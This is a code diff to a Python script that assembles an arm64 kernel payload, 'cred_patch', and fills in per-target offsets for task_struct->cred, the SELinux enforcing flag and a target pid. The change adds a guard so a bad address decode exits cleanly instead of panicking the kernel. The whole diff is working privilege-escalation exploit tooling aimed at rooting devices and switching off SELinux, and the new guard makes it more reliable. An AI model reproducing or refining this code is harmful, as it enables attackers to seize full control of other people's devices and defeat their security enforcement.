@@ -12,15 +12,31 @@ R_AARCH64_CALL26 = 0x11b
 
 def _int(x): return int(x, 16) if isinstance(x, str) and x.lower().startswith("0x") else int(x)
 
-# <carrier> <out> <dsel> <dfv> <dpt> <pid> <dssuse> [enf_off] [cred_off]
+# <carrier> <out> <dsel> <dfv> <dpt> <pid> <dssuse> [enf_off] [cred_off] [dtext] [detext]
 carrier, out = sys.argv[1], sys.argv[2]
 dsel, dfv, dpt, pid, dssuse = (_int(x) for x in sys.argv[3:8])
 enf_off  = _int(sys.argv[8]) if len(sys.argv) > 8 else 0        # selinux_state.enforcing byte offset
 cred_off = _int(sys.argv[9]) if len(sys.argv) > 9 else 0x778    # task_struct->cred
+# optional kernel-text bounds (anchor-relative). If given, the module bails cleanly (ret, no writes)
+# unless the decoded pdr lands in [_text,_etext) — turns a bad/veneer anchor decode into a no-op
+# instead of a kernel panic. Q3 targets omit these (proven direct-bl decode); QPro passes them.
+dtext = _int(sys.argv[10]) if len(sys.argv) > 10 else None   # _text - anchor (lower bound)
+guarded = dtext is not None
+
+# Lower-bound guard only (compact — fits the inject-lib gap): bail (ret 0, no writes) unless
+# pdr >= _text. On arm64 the module region sits BELOW _text, so a PLT-veneer decode lands < _text
+# and is rejected -> a bad anchor decode becomes a clean no-op instead of a kernel panic.
+GUARD = """    // guard: bail unless pdr >= _text (rejects a below-_text PLT veneer / bad decode)
+    movz w9, #0                  // [G0] DTEXT_lo
+    movk w9, #0, lsl #16         // [G1] DTEXT_hi
+    add  x9, x19, w9, sxtw
+    cmp  x19, x9
+    b.lo done"""
 
 # --- assemble the template (substitute per-target struct offsets) ---
 tmpl = open(os.path.join(HERE, "asm", "cred_patch.S.tmpl")).read()
-src = tmpl.replace("@ENF_OFF@", str(enf_off)).replace("@CRED_OFF@", hex(cred_off))
+src = tmpl.replace("@ENF_OFF@", str(enf_off)).replace("@CRED_OFF@", hex(cred_off)) \
+          .replace("@GUARD@", GUARD if guarded else "")
 s = "/tmp/cred_patch.S"; o = "/tmp/cred_patch.o"; b = "/tmp/cred_patch.bin"
 open(s, "w").write(src)
 subprocess.run([CLANG, "-target", "aarch64-linux-gnu", "-c", s, "-o", o], check=True, capture_output=True)
@@ -40,11 +56,12 @@ for off in range(0, len(patch), 4):
     w = struct.unpack_from("<I", patch, off)[0]
     if (w & 0xff800000) in (0x52800000, 0x72800000):  # movz/movk, sf=0 (w-reg)
         mov_offsets.append(off)
-assert len(mov_offsets) == 10, f"expected 10 movz/movk-w, got {len(mov_offsets)}"
-# program order in cred_patch.S: DSEL, DSSUSE, DFV, DPT, PID
-vals = [dsel & 0xffff, (dsel >> 16) & 0xffff, dssuse & 0xffff, (dssuse >> 16) & 0xffff,
-        dfv & 0xffff, (dfv >> 16) & 0xffff, dpt & 0xffff, (dpt >> 16) & 0xffff,
-        pid & 0xffff, (pid >> 16) & 0xffff]
+# program order: [guard: DTEXT] then DSEL, DSSUSE, DFV, DPT, PID
+def lohi(v): return [v & 0xffff, (v >> 16) & 0xffff]
+vals = (lohi(dtext) if guarded else []) + \
+       lohi(dsel) + lohi(dssuse) + lohi(dfv) + lohi(dpt) + lohi(pid)
+want_n = 12 if guarded else 10
+assert len(mov_offsets) == want_n, f"expected {want_n} movz/movk-w, got {len(mov_offsets)}"
 for off, imm in zip(mov_offsets, vals):
     struct.pack_into("<I", patch, off, set_imm16(struct.unpack_from("<I", patch, off)[0], imm))
 
